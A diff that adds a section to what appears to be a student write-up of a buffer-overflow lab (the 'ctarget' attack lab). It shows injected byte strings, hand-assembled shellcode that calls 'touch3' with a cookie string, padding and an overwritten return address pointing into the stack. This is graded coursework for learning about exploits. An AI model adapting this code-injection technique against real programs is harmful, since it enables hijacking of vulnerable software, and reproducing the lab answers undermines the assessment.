@@ -136,3 +136,19 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
  ```
+
+### Part 3
+
+Here is the assembly code we need to inject to our string:
+
+```Assembly
+68 00 00 00 00                                              /* %rsp + 0x08: push 0x0 */ 
+48 83 ec 08                                                 /* %rsp + 0x0d: sub 0x08, %rsp */ 
+48 89 e7                                                    /* %rsp + 0x11: mov %rsp %edi */
+68 fa 18 40 00                                              /* %rsp + 0x14: push 0x4018fa <touch3> */ 
+c3                                                          /* %rsp + 0x19: ret */
+00 00 00 00 00 00                                           /* %rsp + 0x1a: arbitrary bytes */
+00 00 00 00 00 00 00 00                                     /* %rsp + 0x20: arbitrary bytes */
+35 39 62 39 39 37 66 61                                     /* %rsp + 0x28: Cookie string representation */
+78 dc 61 55 00 00 00 00                                     /* %rsp + 0x30: %rsp + 0x08 */
+```
